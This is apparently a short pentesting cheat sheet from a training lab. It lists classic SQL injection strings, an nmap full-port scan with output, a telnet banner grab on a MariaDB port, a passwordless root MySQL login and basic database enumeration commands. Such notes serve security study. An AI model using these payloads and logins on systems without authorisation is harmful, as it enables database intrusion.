## SQL Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet
https://portswigger.net/web-security/sql-injection

If there is a input field in a web page, you can try to inject SQL commands to the database.

```sql
' OR 1=1 --
```

```sql
' UNION SELECT 1,2,3 --
```

## Detect MySQL Port and Version

```bash
nmap -p- <IP> -oA fullport --min-rate=10000
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-10 19:48 -03                      
Nmap scan report for 10.129.95.232 (10.129.95.232)                                   
Host is up (0.20s latency).                                                          
Not shown: 65534 closed ports                                                        
PORT     STATE SERVICE
3306/tcp open  mysql 
```

```bash
user in ~ λ telnet 10.129.95.232 3306                                            
Trying 10.129.95.232...                                                              
Connected to 10.129.95.232.
Escape character is '^]'.
5.5.5-10.3.27-MariaDB-0+deb10u13"f^#3toS-19h"n
```

## Connect with weak credentials

```bash
mysql -h <IP> -u root
mysql --host=localhost --user=myname --password=password mydb
```

## Commannds

```sql
SHOW DATABASES;
use <DATABASE>;
SHOW TABLES;
```